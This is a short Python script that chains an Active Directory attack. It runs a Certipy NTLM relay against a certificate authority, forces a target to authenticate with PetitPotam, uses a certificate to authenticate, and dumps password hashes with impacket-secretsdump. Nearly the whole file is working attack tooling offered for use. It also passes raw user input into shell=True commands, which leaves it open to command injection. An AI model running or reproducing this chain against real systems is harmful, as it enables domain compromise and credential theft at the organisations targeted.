import os
import subprocess
import getpass

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode('utf-8'), stderr.decode('utf-8')

def setup_certipy_relay(dc_ip, ca_server):
    command = f"certipy relay -dc-ip {dc_ip} -ca {ca_server}"
    return run_command(command)

def coerce_authentication(listener_ip, target_ip, username, password):
    command = f"python3 PetitPotam.py -u {username} -p {password} {listener_ip} {target_ip}"
    return run_command(command)

def acquire_certificate(username, domain, dc_ip, certificate_path):
    command = f"certipy auth -username {username} -domain {domain} -dc-ip {dc_ip} -pfx {certificate_path}"
    return run_command(command)

def dump_user_hashes(domain, username, target_ip, hash):
    command = f"impacket-secretsdump {domain}/{username}@{target_ip} -hashes {hash}"
    return run_command(command)

def main():
    dc_ip = input("Enter the Domain Controller IP: ")
    ca_server = input("Enter the CA Server Name: ")
    listener_ip = input("Enter the Listener IP: ")
    target_ip = input("Enter the Target IP: ")
    username = input("Enter the Username: ")
    password = getpass.getpass("Enter the Password: ")
    domain = input("Enter the Domain: ")
    certificate_path = input("Enter the Path to Certificate: ")
    hash = input("Enter the Hash: ")

    print("Setting up Certipy Relay...")
    setup_output, setup_error = setup_certipy_relay(dc_ip, ca_server)
    print("Output:", setup_output)
    print("Error:", setup_error)

    print("Coercing Authentication with PetitPotam...")
    auth_output, auth_error = coerce_authentication(listener_ip, target_ip, username, password)
    print("Output:", auth_output)
    print("Error:", auth_error)

    print("Acquiring Certificate...")
    cert_output, cert_error = acquire_certificate(username, domain, dc_ip, certificate_path)
    print("Output:", cert_output)
    print("Error:", cert_error)

    print("Dumping User Hashes...")
    dump_output, dump_error = dump_user_hashes(domain, username, target_ip, hash)
    print("Output:", dump_output)
    print("Error:", dump_error)

if __name__ == "__main__":
    main()
